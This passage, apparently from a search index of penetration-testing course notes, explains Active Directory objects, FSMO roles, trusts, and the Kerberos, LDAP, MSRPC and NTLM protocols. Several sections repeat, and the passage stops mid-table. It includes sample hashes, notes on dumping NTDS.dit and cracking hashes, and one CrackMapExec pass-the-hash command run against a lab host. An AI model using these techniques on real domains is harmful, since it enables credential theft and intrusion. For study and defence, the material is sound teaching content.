the object is stripped of most of its attributes and placed in the Deleted Objects container for the duration of the tombstoneLifetime. It can be recovered, but any attributes that were lost can no longer be recovered. AD Recycle Bin The AD Recycle Bin was first introduced in Windows Server 2008 R2 to facilitate the recovery of deleted AD objects. This made it easier for sysadmins to restore objects, avoiding the need to restore from backups, restarting Active Directory Domain Services (AD DS), or rebooting a Domain Controller. When the AD Recycle Bin is enabled, any deleted objects are preserved for a period of time, facilitating restoration if needed. Sysadmins can set how long an object remains in a deleted, recoverable state. If this is not specified, the object will be restorable for a default value of 60 days. The biggest advantage of using the AD Recycle Bin is that most of a deleted object's attributes are preserved, which makes it far easier to fully restore a deleted object to its previous state. SYSVOL The SYSVOL folder, or share, stores copies of public files in the domain such as system policies, Group Policy settings, logon/logoff scripts, and often contains other types of scripts that are executed to perform various tasks in the AD environment. The contents of the SYSVOL folder are replicated to all DCs within the environment using File Replication Services (FRS). You can read more about the SYSVOL structure here. AdminSDHolder The AdminSDHolder object is used to manage ACLs for members of built-in groups in AD marked as privileged. It acts as a container that holds the Security Descriptor applied to members of protected groups. The SDProp (SD Propagator) process runs on a schedule on the PDC Emulator Domain Controller. When this process runs, it checks members of protected groups to ensure that the correct ACL is applied to them. It runs every hour by default. For example, suppose an attacker is able to create a malicious ACL entry to grant a user certain rights over a member of the Domain Admins group. In that case, unless they modify other settings in AD, these rights will be removed (and they will lose any persistence they were hoping to achieve) when the SDProp process runs on the set interval. dsHeuristics The dsHuerisitcs attribute is a string value set on the Directory Service object used to define multiple forest-wide configuration settings. One of these settings is to exclude built-in groups from the Protected Groups list. Groups in this list are protected from modification via the AdminSDHolder object. If a group is excluded via the dsHuerisitcs attribute, then any changes that affect it will not be reverted when the SDProp process runs. adminCount The adminCount attribute determines whether or not the SDProp process protects a user. If the value is set to 0 or not specified, the user is not protected. If the attribute value is set to value, the user is protected. Attackers will often look for accounts with the adminCount attribute set to 1 to target in an internal environment. These are often privileged accounts and may lead to further access or full domain compromise. Active Directory Users and Computers (ADUC) ADUC is a GUI console commonly used for managing users, groups, computers, and contacts in AD. Changes made in ADUC can be done via PowerShell as well. ADSI Edit ADSI Edit is a GUI tool used to manage objects in AD. It provides access to far more than is available in ADUC and can be used to set or delete any attribute available on an object, add, remove, and move objects as well. It is a powerful tool that allows a user to access AD at a much deeper level. Great care should be taken when using this tool, as changes here could cause major problems in AD. sIDHistory This attribute holds any SIDs that an object was assigned previously. It is usually used in migrations so a user can maintain the same level of access when migrated from one domain to another. This attribute can potentially be abused if set insecurely, allowing an attacker to gain prior elevated access that an account had before a migration if SID Filtering (or removing SIDs from another domain from a user's access token that could be used for elevated access) is not enabled. NTDS.DIT The NTDS.DIT file can be considered the heart of Active Directory. It is stored on a Domain Controller at C:\\Windows\\NTDS and is a database that stores AD data such as information about user and group objects, group membership, and, most important to attackers and penetration testers, the password hashes for all users in the domain. Once full domain compromise is reached, an attacker can retrieve this file, extract the hashes, and either use them to perform a pass-the-hash attack or crack them offline using a tool such as Hashcat to access additional resources in the domain. If the setting Store password with reversible encryption is enabled, then the NTDS.DIT will also store the cleartext passwords for all users created or who changed their password after this policy was set. While rare, some organizations may enable this setting if they use applications or protocols that need to use a user's existing password (and not Kerberos) for authentication.","title":"Active Directory Terminology"},{"location":"active_directory/ad_fundamentals/#active-directory-objects","text":"Users These are the users within the organization's AD environment. Users are considered leaf objects , which means that they cannot contain any other objects within them. Another example of a leaf object is a mailbox in Microsoft Exchange. A user object is considered a security principal and has a security identifier (SID) and a global unique identifier (GUID). User objects have many possible attributes, such as their display name, last login time, date of last password change, email address, account description, manager, address, and more. They are a crucial target for attackers since gaining access to even a low privileged user can grant access to many objects and resources and allow for detailed enumeration of the entire domain (or forest). Contacts A contact object is usually used to represent an external user and contains informational attributes such as first name, last name, email address, telephone number, etc. They are leaf objects and are NOT security principals (securable objects), so they don't have a SID, only a GUID. An example would be a contact card for a third-party vendor or a customer. Printers A printer object points to a printer accessible within the AD network. Like a contact, a printer is a leaf object and not a security principal, so it only has a GUID. Printers have attributes such as the printer's name, driver information, port number, etc. Computers A computer object is any computer joined to the AD network (workstation or server). Computers are leaf objects because they do not contain other objects. However, they are considered security principals and have a SID and a GUID. Like users, they are prime targets for attackers since full administrative access to a computer (as the all-powerful NT AUTHORITY\\SYSTEM account) grants similar rights to a standard domain user and can be used to perform the majority of the enumeration tasks that a user account can (save for a few exceptions across domain trusts.) Shared Folders A shared folder object points to a shared folder on the specific computer where the folder resides. Shared folders can have stringent access control applied to them and can be either accessible to everyone (even those without a valid AD account), open to only authenticated users (which means anyone with even the lowest privileged user account OR a computer account ( NT AUTHORITY\\SYSTEM ) could access it), or be locked down to only allow certain users/groups access. Anyone not explicitly allowed access will be denied from listing or reading its contents. Shared folders are NOT security principles and only have a GUID. A shared folder's attributes can include the name, location on the system, security access rights. Groups A group is considered a container object because it can contain other objects, including users, computers, and even other groups. A group IS regarded as a security principal and has a SID and a GUID. In AD, groups are a way to manage user permissions and access to other securable objects (both users and computers). Let's say we want to give 20 help desk users access to the Remote Management Users group on a jump host. Instead of adding the users one by one, we could add the group, and the users would inherit the intended permissions via their membership in the group. In Active Directory, we commonly see what are called \"nested groups\" (a group added as a member of another group), which can lead to a user(s) obtaining unintended rights. Nested group membership is something we see and often leverage during penetration tests. The tool BloodHound helps to discover attack paths within a network and illustrate them in a graphical interface. It is excellent for auditing group membership and uncovering/seeing the sometimes unintended impacts of nested group membership. Groups in AD can have many attributes, the most common being the name, description, membership, and other groups that the group belongs to. Many other attributes can be set, which we will discuss more in-depth later in this module. Organizational Units (OUs) An organizational unit, or OU from here on out, is a container that systems administrators can use to store similar objects for ease of administration. OUs are often used for administrative delegation of tasks without granting a user account full administrative rights. For example, we may have a top-level OU called Employees and then child OUs under it for the various departments such as Marketing, HR, Finance, Help Desk, etc. If an account were given the right to reset passwords over the top-level OU, this user would have the right to reset passwords for all users in the company. However, if the OU structure were such that specific departments were child OUs of the Help Desk OU, then any user placed in the Help Desk OU would have this right delegated to them if granted. Other tasks that may be delegated at the OU level include creating/deleting users, modifying group membership, managing Group Policy links, and performing password resets. OUs are very useful for managing Group Policy (which we will study later in this module) settings across a subset of users and groups within a domain. For example, we may want to set a specific password policy for privileged service accounts so these accounts could be placed in a particular OU and then have a Group Policy object assigned to it, which would enforce this password policy on all accounts placed inside of it. A few OU attributes include its name, members, security settings, and more. Domain A domain is the structure of an AD network. Domains contain objects such as users and computers, which are organized into container objects: groups and OUs. Every domain has its own separate database and sets of policies that can be applied to any and all objects within the domain. Some policies are set by default (and can be tweaked), such as the domain password policy. In contrast, others are created and applied based on the organization's need, such as blocking access to cmd.exe for all non-administrative users or mapping shared drives at log in. Domain Controllers Domain Controllers are essentially the brains of an AD network. They handle authentication requests, verify users on the network, and control who can access the various resources in the domain. All access requests are validated via the domain controller and privileged access requests are based on predetermined roles assigned to users. It also enforces security policies and stores information about every other object in the domain. Sites A site in AD is a set of computers across one or more subnets connected using high-speed links. They are used to make replication across domain controllers run efficiently. Built-in In AD, built-in is a container that holds default groups in an AD domain. They are predefined when an AD domain is created. Foreign Security Principals A foreign security principal (FSP) is an object created in AD to represent a security principal that belongs to a trusted external forest. They are created when an object such as a user, group, or computer from an external (outside of the current) forest is added to a group in the current domain. They are created automatically after adding a security principal to a group. Every foreign security principal is a placeholder object that holds the SID of the foreign object (an object that belongs to another forest.) Windows uses this SID to resolve the object's name via the trust relationship. FSPs are created in a specific container named ForeignSecurityPrincipals with a distinguished name like cn=ForeignSecurityPrincipals,dc=inlanefreight,dc=local .","title":"Active Directory Objects"},{"location":"active_directory/ad_fundamentals/#active-directory-functionality","text":"There are five Flexible Single Master Operation (FSMO) roles. These roles can be defined as follows: Roles Description Schema Master This role manages the read/write copy of the AD schema, which defines all attributes that can apply to an object in AD. Domain Naming Master Manages domain names and ensures that two domains of the same name are not created in the same forest. Relative ID (RID) Master The RID Master assigns blocks of RIDs to other DCs within the domain that can be used for new objects. The RID Master helps ensure that multiple objects are not assigned the same SID. Domain object SIDs are the domain SID combined with the RID number assigned to the object to make the unique SID. PDC Emulator The host with this role would be the authoritative DC in the domain and respond to authentication requests, password changes, and manage Group Policy Objects (GPOs). The PDC Emulator also maintains time within the domain. Infrastructure Master This role translates GUIDs, SIDs, and DNs between domains. This role is used in organizations with multiple domains in a single forest. The Infrastructure Master helps them to communicate. If this role is not functioning properly, Access Control Lists (ACLs) will show SIDs instead of fully resolved names. Depending on the organization, these roles may be assigned to specific DCs or as defaults each time a new DC is added. Issues with FSMO roles will lead to authentication and authorization difficulties within a domain.","title":"Active Directory Functionality"},{"location":"active_directory/ad_fundamentals/#domain-and-forest-functional-levels","text":"Microsoft introduced functional levels to determine the various features and capabilities available in Active Directory Domain Services (AD DS) at the domain and forest level. They are also used to specify which Windows Server operating systems can run a Domain Controller in a domain or forest. Domain Functional Level Features Available Supported Domain Controller Operating Systems Windows 2000 native Universal groups for distribution and security groups, group nesting, group conversion (between security and distribution and security groups), SID history. Windows Server 2008 R2, Windows Server 2008, Windows Server 2003, Windows 2000 Windows Server 2003 Netdom.exe domain management tool, lastLogonTimestamp attribute introduced, well-known users and computers containers, constrained delegation, selective authentication. Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008, Windows Server 2003 Windows Server 2008 Distributed File System (DFS) replication support, Advanced Encryption Standard (AES 128 and AES 256) support for the Kerberos protocol, Fine-grained password policies Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2, Windows Server 2008 Windows Server 2008 R2 Authentication mechanism assurance, Managed Service Accounts Windows Server 2012 R2, Windows Server 2012, Windows Server 2008 R2 Windows Server 2012 KDC support for claims, compound authentication, and Kerberos armoring Windows Server 2012 R2, Windows Server 2012 Windows Server 2012 R2 Extra protections for members of the Protected Users group, Authentication Policies, Authentication Policy Silos Windows Server 2012 R2 Windows Server 2016 Smart card required for interactive logon new Kerberos features and new credential protection features Windows Server 2019 and Windows Server 2016 A new functional level was not added with the release of Windows Server 2019. However, Windows Server 2008 functional level is the minimum requirement for adding Server 2019 Domain Controllers to an environment. Also, the target domain has to use DFS-R for SYSVOL replication. Forest functional levels have introduced a few key capabilities over the years: Version Capabilities Windows Server 2003 saw the introduction of the forest trust, domain renaming, read-only domain controllers (RODC), and more. Windows Server 2008 All new domains added to the forest default to the Server 2008 domain functional level. No additional new features. Windows Server 2008 R2 Active Directory Recycle Bin provides the ability to restore deleted objects when AD DS is running. Windows Server 2012 All new domains added to the forest default to the Server 2012 domain functional level. No additional new features. Windows Server 2012 R2 All new domains added to the forest default to the Server 2012 R2 domain functional level. No additional new features. Windows Server 2016 Privileged access management (PAM) using Microsoft Identity Manager (MIM).","title":"Domain and Forest Functional Levels"},{"location":"active_directory/ad_fundamentals/#trusts","text":"A trust is used to establish forest-forest or domain-domain authentication, allowing users to access resources in (or administer) another domain outside of the domain their account resides in. A trust creates a link between the authentication systems of two domains. Trust Type Description Parent-child Domains within the same forest. The child domain has a two-way transitive trust with the parent domain. Cross-link a trust between child domains to speed up authentication. External A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID filtering. Tree-root a two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest. Forest a transitive trust between two forest root domains. Trusts can be transitive or non-transitive. A transitive trust means that trust is extended to objects that the child domain trusts. In a non-transitive trust, only the child domain itself is trusted. Trusts can be set up to be one-way or two-way (bidirectional). In bidirectional trusts, users from both trusting domains can access resources. In a one-way trust, only users in a trusted domain can access resources in a trusting domain, not vice-versa. The direction of trust is opposite to the direction of access. Often, domain trusts are set up improperly and provide unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications. Mergers and acquisitions can result in bidirectional trusts with acquired companies, unknowingly introducing risk into the acquiring company\u2019s environment. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain.","title":"Trusts"},{"location":"active_directory/ad_protocols/","text":"Keberos, DNS, LDAP, MSRPC \u00b6 While Windows operating systems use a variety of protocols to communicate, Active Directory specifically requires Lightweight Directory Access Protocol (LDAP) , Microsoft's version of Kerberos , DNS for authentication and communication, and MSRPC which is the Microsoft implementation of Remote Procedure Call (RPC) , an interprocess communication technique used for client-server model-based applications. Keberos \u00b6 Kerberos Authentication Process 1. The user logs on, and their password is converted to an NTLM hash, which is used to encrypt the TGT ticket. This decouples the user's credentials from requests to resources. 2. The KDC service on the DC checks the authentication service request (AS-REQ), verifies the user information, and creates a Ticket Granting Ticket (TGT), which is delivered to the user. 3. The user presents the TGT to the DC, requesting a Ticket Granting Service (TGS) ticket for a specific service. This is the TGS-REQ. If the TGT is successfully validated, its data is copied to create a TGS ticket. 4. The TGS is encrypted with the NTLM password hash of the service or computer account in whose context the service instance is running and is delivered to the user in the TGS_REP. 5. The user presents the TGS to the service, and if it is valid, the user is permitted to connect to the resource (AP_REQ). The Kerberos protocol uses port 88 (both TCP and UDP). When enumerating an Active Directory environment, we can often locate Domain Controllers by performing port scans looking for open port 88 using a tool such as Nmap. DNS \u00b6 Active Directory Domain Services (AD DS) uses DNS to allow clients (workstations, servers, and other systems that communicate with the domain) to locate Domain Controllers and for Domain Controllers that host the directory service to communicate amongst themselves. DNS is used to resolve hostnames to IP addresses and is broadly used across internal networks and the internet. Private internal networks use Active Directory DNS namespaces to facilitate communications between servers, clients, and peers. AD maintains a database of services running on the network in the form of service records (SRV). These service records allow clients in an AD environment to locate services that they need, such as a file server, printer, or Domain Controller. Dynamic DNS is used to make changes in the DNS database automatically should a system's IP address change. Forward DNS Lookup We can perform a nslookup for the domain name and retrieve all Domain Controllers' IP addresses in a domain. PS C:\\htb> nslookup INLANEFREIGHT.LOCAL Server: 172.16.6.5 Address: 172.16.6.5 Name: INLANEFREIGHT.LOCAL Address: 172.16.6.5 Reverse DNS Lookup Obtain the DNS name of a single host using the IP address PS C:\\htb> nslookup 172.16.6.5 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5 Finding IP Address of a Host Can do this with or without specifying the FQDN PS C:\\htb> nslookup ACADEMY-EA-DC01 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5 LDAP \u00b6 Active Directory supports Lightweight Directory Access Protocol (LDAP) for directory lookups. LDAP is an open-source and cross-platform protocol used for authentication against various directory services (such as AD). The latest LDAP specification is Version 3 , published as RFC 4511. A firm understanding of how LDAP works in an AD environment is crucial for attackers and defenders. LDAP uses port 389, and LDAP over SSL (LDAPS) communicates over port 636. AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that provide directory services. In other words, LDAP is how systems in the network environment can \"speak\" to AD. An LDAP session begins by first connecting to an LDAP server, also known as a Directory System Agent. The Domain Controller in AD actively listens for LDAP requests, such as security authentication requests. The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol. While uncommon, you may come across organizations while performing an assessment that does not have AD but does have LDAP, meaning that they most likely use another type of LDAP server such as OpenLDAP . AD LDAP Authentication LDAP is set up to authenticate credentials against AD using a \"BIND\" operation to set the authentication state for an LDAP session. There are two types of LDAP authentication. Simple Authentication : This includes anonymous authentication, unauthenticated authentication, and username/password authentication. Simple authentication means that a username and password create a BIND request to authenticate to the LDAP server. SASL Authentication : The Simple Authentication and Security Layer (SASL) framework uses other authentication services, such as Kerberos, to bind to the LDAP server and then uses this authentication service (Kerberos in this example) to authenticate to LDAP. The LDAP server uses the LDAP protocol to send an LDAP message to the authorization service, which initiates a series of challenge/response messages resulting in either successful or unsuccessful authentication. SASL can provide additional security due to the separation of authentication methods from application protocols. LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network. It is recommended to use TLS encryption or similar to safeguard this information in transit. MSRPC \u00b6 MSRPC is Microsoft's implementation of Remote Procedure Call (RPC), an interprocess communication technique used for client-server model-based applications. Windows systems use MSRPC to access systems in Active Directory using four key RPC interfaces. Interface Name Description lsarpc A set of RPC calls to the Local Security Authority (LSA) system which manages the local security policy on a computer, controls the audit policy, and provides interactive authentication services. LSARPC is used to perform management on domain security policies. netlogon Netlogon is a Windows process used to authenticate users and other services in the domain environment. It is a service that continuously runs in the background. samr Remote SAM (samr) provides management functionality for the domain account database, storing information about users and groups. IT administrators use the protocol to manage users, groups, and computers by enabling admins to create, read, update, and delete information about security principles. Attackers (and pentesters) can use the samr protocol to perform reconnaissance about the internal domain using tools such as BloodHound to visually map out the AD network and create \"attack paths\" to illustrate visually how administrative access or full domain compromise could be achieved. Organizations can protect against this type of reconnaissance by changing a Windows registry key to only allow administrators to perform remote SAM queries since, by default, all authenticated domain users can make these queries to gather a considerable amount of information about the AD domain. drsuapi drsuapi is the Microsoft API that implements the Directory Replication Service (DRS) Remote Protocol which is used to perform replication-related tasks across Domain Controllers in a multi-DC environment. Attackers can utilize drsuapi to create a copy of the Active Directory domain database (NTDS.dit) file to retrieve password hashes for all accounts in the domain, which can then be used to perform Pass-the-Hash attacks to access more systems or cracked offline using a tool such as Hashcat to obtain the cleartext password to log in to systems using remote management protocols such as Remote Desktop (RDP) and WinRM. NTLM Authentication \u00b6 Aside from Kerberos and LDAP, Active Directory uses several other authentication methods which can be used (and abused) by applications and services in AD. These include LM, NTLM, NTLMv1, and NTLMv2. LM and NTLM here are the hash names, and NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash. Hash Protocol Comparison \u00b6 Hash/Protocol Cryptographic technique Mutual Authentication Message Type Trusted Third Party NTLM Symmetric key cryptography No Random number Domain Controller NTLMv1 Symmetric key cryptography No MD4 hash, random number Domain Controller NTLMv2 Symmetric key cryptography No MD4 hash, random number Domain Controller Kerberos Symmetric key cryptography & asymmetric cryptography Yes Encrypted ticket using DES, MD5 Domain Controller,/Key Distribution Center (KDC) LM \u00b6 LAN Manager (LM) hashes are the oldest password storage mechanism used by the Windows operating system. LM debuted in 1987 on the OS/2 operating system. If in use, they are stored in the SAM database on a Windows host and the NTDS.DIT database on a Domain Controller. Due to significant security weaknesses in the hashing algorithm used for LM hashes, it has been turned off by default since Windows Vista/Server 2008. However, it is still common to encounter, especially in large environments where older systems are still used. Passwords using LM are limited to a maximum of 14 characters. Passwords are not case sensitive and are converted to uppercase before generating the hashed value, limiting the keyspace to a total of 69 characters making it relatively easy to crack these hashes using a tool such as Hashcat. Before hashing, a 14 character password is first split into two seven-character chunks. If the password is less than fourteen characters, it will be padded with NULL characters to reach the correct value. Two DES keys are created from each chunk. These chunks are then encrypted using the string KGS!@#$% , creating two 8-byte ciphertext values. These two values are then concatenated together, resulting in an LM hash. This hashing algorithm means that an attacker only needs to brute force seven characters twice instead of the entire fourteen characters, making it fast to crack LM hashes on a system with one or more GPUs. If a password is seven characters or less, the second half of the LM hash will always be the same value and could even be determined visually without even needed tools such as Hashcat. The use of LM hashes can be disallowed using Group Policy . An LM hash takes the form of 299bd128c1101fd6 . NTHash (NTLM) \u00b6 NT LAN Manager (NTLM) hashes are used on modern Windows systems. It is a challenge-response authentication protocol and uses three messages to authenticate: a client first sends a NEGOTIATE_MESSAGE to the server, whose response is a CHALLENGE_MESSAGE to verify the client's identity. Lastly, the client responds with an AUTHENTICATE_MESSAGE . These hashes are stored locally in the SAM database or the NTDS.DIT database file on a Domain Controller. The protocol has two hashed password values to choose from to perform authentication: the LM hash (as discussed above) and the NT hash, which is the MD4 hash of the little-endian UTF-16 value of the password. The algorithm can be visualized as: MD4(UTF-16-LE(password)) . Even though they are considerably stronger than LM hashes (supporting the entire Unicode character set of 65,536 characters), they can still be brute-forced offline relatively quickly using a tool such as Hashcat. GPU attacks have shown that the entire NTLM 8 character keyspace can be brute-forced in under 3 hours . Longer NTLM hashes can be more challenging to crack depending on the password chosen, and even long passwords (15+ characters) can be cracked using an offline dictionary attack combined with rules. NTLM is also vulnerable to the pass-the-hash attack, which means an attacker can use just the NTLM hash (after obtaining via another successful attack) to authenticate to target systems where the user is a local admin without needing to know the cleartext value of the password. An NT hash takes the form of b4b9b02e6f09a9bd760f388b67351e2b , which is the second half of the full NTLM hash. An NTLM hash looks like this: NTLM Authentication Request Rachel:500:aad3c435b514a4eeaad3b935b51304fe:e46b9e548fa0d122de7f59fb6d48eaa2::: We can break the HTLM hash down into its individual parts: Rachel is the username 500 is the Relative Identifier (RID). 500 is the known RID for the administrator account aad3c435b514a4eeaad3b935b51304fe is the LM hash and, if LM hashes are disabled on the system, can not be used for anything e46b9e548fa0d122de7f59fb6d48eaa2 is the NT hash. This hash can either be cracked offline to reveal the cleartext value (depending on the length/strength of the password) or used for a pass-the-hash attack. Below is an example of a successful pass-the-hash attack using the CrackMapExec tool: hrmns@htb[/htb]$ crackmapexec smb 10.129.41.19 -u rachel -H e46b9e548fa0d122de7f59fb6d48eaa2 SMB 10.129.43.9 445 DC01 [*] Windows 10.0 Build 17763 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False) SMB 10.129.43.9 445 DC01 [+] INLANEFREIGHT.LOCAL\\rachel:e46b9e548fa0d122de7f59fb6d48eaa2 (Pwn3d!) NTLMv1 (Net-NTMLv1) \u00b6 The NTLM protocol performs a challenge/response between a server and client using the NT hash. NTLMv1 uses both the NT and the LM hash, which can make it easier to \"crack\" offline after capturing a hash using a tool such as Responder or via an NTLM relay attack . NTLMv1 Hash Example u4-netntlm::kNS:338d08f8e26de93300000000000000000000000000000000:9526fb8c23a90751cdd619b6cea564742e1e4bf33006ba41:cb8086049ec4736c NTLMv1 was the building block for modern NTLM authentication. Like any protocol, it has flaws and is susceptible to cracking and other attacks. NTLMv2 (Net-NTLMv2) \u00b6 The NTLMv2 protocol was first introduced in Windows NT 4.0 SP4 and was created as a stronger alternative to NTLMv1. It has been the default in Windows since Server 2000. It is hardened against certain spoofing attacks that NTLMv1 is susceptible to. NTLMv2 sends two responses to the 8-byte challenge received by the server. These responses contain a 16-byte HMAC-MD5 hash of the challenge, a randomly generated challenge from the client, and an HMAC-MD5 hash of the user's credentials. A second response is sent, using a variable-length client challenge including the current time, an 8-byte random value, and the domain name. NTLMv2 Hash Example admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 Developers improved upon v1 by making NTLMv2 harder to crack and giving it a more robust algorithm made up of multiple stages. Domain Cached Credentials (MSCache2) \u00b6 In an AD environment, the authentication methods mentioned in this section and the previous require the host we are trying to access to communicate with the \"brains\" of the network, the Domain Controller. Microsoft developed the MS Cache v1 and v2 algorithm (also known as Domain Cached Credentials (DCC) to solve the potential issue of a domain-joined host being unable to communicate with a domain controller (i.e., due to a network outage or other technical issue) and, hence, NTLM/Kerberos authentication not working to access the host in question. Hosts save the last ten hashes for any domain users that successfully log into the machine in the HKEY_LOCAL_MACHINE\\SECURITY\\Cache registry key. These hashes cannot be used in pass-the-hash attacks. Furthermore, the hash is very slow to crack with a tool such as Hashcat, even when using an extremely powerful GPU cracking rig, so attempts to crack these hashes typically need to be extremely targeted or rely on a very weak password in use. These hashes can be obtained by an attacker or pentester after gaining local admin access to a host and have the following format: $DCC2$10240#bjones#e4e938d12fe5974dc42a90120bd9c90f . It is vital as penetration testers that we understand the varying types of hashes that we may encounter while assessing an AD environment, their strengths, weaknesses, how they can be abused (cracking to cleartext, pass-the-hash, or relayed), and when an attack may be futile (i.e., spending days attempting to crack a set of Domain Cached Credentials).","title":"Protocols"},{"location":"active_directory/ad_protocols/#keberos-dns-ldap-msrpc","text":"While Windows operating systems use a variety of protocols to communicate, Active Directory specifically requires Lightweight Directory Access Protocol (LDAP) , Microsoft's version of Kerberos , DNS for authentication and communication, and MSRPC which is the Microsoft implementation of Remote Procedure Call (RPC) , an interprocess communication technique used for client-server model-based applications.","title":"Keberos, DNS, LDAP, MSRPC"},{"location":"active_directory/ad_protocols/#keberos","text":"Kerberos Authentication Process 1. The user logs on, and their password is converted to an NTLM hash, which is used to encrypt the TGT ticket. This decouples the user's credentials from requests to resources. 2. The KDC service on the DC checks the authentication service request (AS-REQ), verifies the user information, and creates a Ticket Granting Ticket (TGT), which is delivered to the user. 3. The user presents the TGT to the DC, requesting a Ticket Granting Service (TGS) ticket for a specific service. This is the TGS-REQ. If the TGT is successfully validated, its data is copied to create a TGS ticket. 4. The TGS is encrypted with the NTLM password hash of the service or computer account in whose context the service instance is running and is delivered to the user in the TGS_REP. 5. The user presents the TGS to the service, and if it is valid, the user is permitted to connect to the resource (AP_REQ). The Kerberos protocol uses port 88 (both TCP and UDP). When enumerating an Active Directory environment, we can often locate Domain Controllers by performing port scans looking for open port 88 using a tool such as Nmap.","title":"Keberos"},{"location":"active_directory/ad_protocols/#dns","text":"Active Directory Domain Services (AD DS) uses DNS to allow clients (workstations, servers, and other systems that communicate with the domain) to locate Domain Controllers and for Domain Controllers that host the directory service to communicate amongst themselves. DNS is used to resolve hostnames to IP addresses and is broadly used across internal networks and the internet. Private internal networks use Active Directory DNS namespaces to facilitate communications between servers, clients, and peers. AD maintains a database of services running on the network in the form of service records (SRV). These service records allow clients in an AD environment to locate services that they need, such as a file server, printer, or Domain Controller. Dynamic DNS is used to make changes in the DNS database automatically should a system's IP address change. Forward DNS Lookup We can perform a nslookup for the domain name and retrieve all Domain Controllers' IP addresses in a domain. PS C:\\htb> nslookup INLANEFREIGHT.LOCAL Server: 172.16.6.5 Address: 172.16.6.5 Name: INLANEFREIGHT.LOCAL Address: 172.16.6.5 Reverse DNS Lookup Obtain the DNS name of a single host using the IP address PS C:\\htb> nslookup 172.16.6.5 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5 Finding IP Address of a Host Can do this with or without specifying the FQDN PS C:\\htb> nslookup ACADEMY-EA-DC01 Server: 172.16.6.5 Address: 172.16.6.5 Name: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL Address: 172.16.6.5","title":"DNS"},{"location":"active_directory/ad_protocols/#ldap","text":"Active Directory supports Lightweight Directory Access Protocol (LDAP) for directory lookups. LDAP is an open-source and cross-platform protocol used for authentication against various directory services (such as AD). The latest LDAP specification is Version 3 , published as RFC 4511. A firm understanding of how LDAP works in an AD environment is crucial for attackers and defenders. LDAP uses port 389, and LDAP over SSL (LDAPS) communicates over port 636. AD stores user account information and security information such as passwords and facilitates sharing this information with other devices on the network. LDAP is the language that applications use to communicate with other servers that provide directory services. In other words, LDAP is how systems in the network environment can \"speak\" to AD. An LDAP session begins by first connecting to an LDAP server, also known as a Directory System Agent. The Domain Controller in AD actively listens for LDAP requests, such as security authentication requests. The relationship between AD and LDAP can be compared to Apache and HTTP. The same way Apache is a web server that uses the HTTP protocol, Active Directory is a directory server that uses the LDAP protocol. While uncommon, you may come across organizations while performing an assessment that does not have AD but does have LDAP, meaning that they most likely use another type of LDAP server such as OpenLDAP . AD LDAP Authentication LDAP is set up to authenticate credentials against AD using a \"BIND\" operation to set the authentication state for an LDAP session. There are two types of LDAP authentication. Simple Authentication : This includes anonymous authentication, unauthenticated authentication, and username/password authentication. Simple authentication means that a username and password create a BIND request to authenticate to the LDAP server. SASL Authentication : The Simple Authentication and Security Layer (SASL) framework uses other authentication services, such as Kerberos, to bind to the LDAP server and then uses this authentication service (Kerberos in this example) to authenticate to LDAP. The LDAP server uses the LDAP protocol to send an LDAP message to the authorization service, which initiates a series of challenge/response messages resulting in either successful or unsuccessful authentication. SASL can provide additional security due to the separation of authentication methods from application protocols. LDAP authentication messages are sent in cleartext by default so anyone can sniff out LDAP messages on the internal network. It is recommended to use TLS encryption or similar to safeguard this information in transit.","title":"LDAP"},{"location":"active_directory/ad_protocols/#msrpc","text":"MSRPC is Microsoft's implementation of Remote Procedure Call (RPC), an interprocess communication technique used for client-server model-based applications. Windows systems use MSRPC to access systems in Active Directory using four key RPC interfaces. Interface Name Description lsarpc A set of RPC calls to the Local Security Authority (LSA) system which manages the local security policy on a computer, controls the audit policy, and provides interactive authentication services. LSARPC is used to perform management on domain security policies. netlogon Netlogon is a Windows process used to authenticate users and other services in the domain environment. It is a service that continuously runs in the background. samr Remote SAM (samr) provides management functionality for the domain account database, storing information about users and groups. IT administrators use the protocol to manage users, groups, and computers by enabling admins to create, read, update, and delete information about security principles. Attackers (and pentesters) can use the samr protocol to perform reconnaissance about the internal domain using tools such as BloodHound to visually map out the AD network and create \"attack paths\" to illustrate visually how administrative access or full domain compromise could be achieved. Organizations can protect against this type of reconnaissance by changing a Windows registry key to only allow administrators to perform remote SAM queries since, by default, all authenticated domain users can make these queries to gather a considerable amount of information about the AD domain. drsuapi drsuapi is the Microsoft API that implements the Directory Replication Service (DRS) Remote Protocol which is used to perform replication-related tasks across Domain Controllers in a multi-DC environment. Attackers can utilize drsuapi to create a copy of the Active Directory domain database (NTDS.dit) file to retrieve password hashes for all accounts in the domain, which can then be used to perform Pass-the-Hash attacks to access more systems or cracked offline using a tool such as Hashcat to obtain the cleartext password to log in to systems using remote management protocols such as Remote Desktop (RDP) and WinRM.","title":"MSRPC"},{"location":"active_directory/ad_protocols/#ntlm-authentication","text":"Aside from Kerberos and LDAP, Active Directory uses several other authentication methods which can be used (and abused) by applications and services in AD. These include LM, NTLM, NTLMv1, and NTLMv2. LM and NTLM here are the hash names, and NTLMv1 and NTLMv2 are authentication protocols that utilize the LM or NT hash.","title":"NTLM Authentication"},{"location":"active_directory/ad_protocols/#hash-protocol-comparison","text":"Hash/Protocol Cryptographic technique Mutual 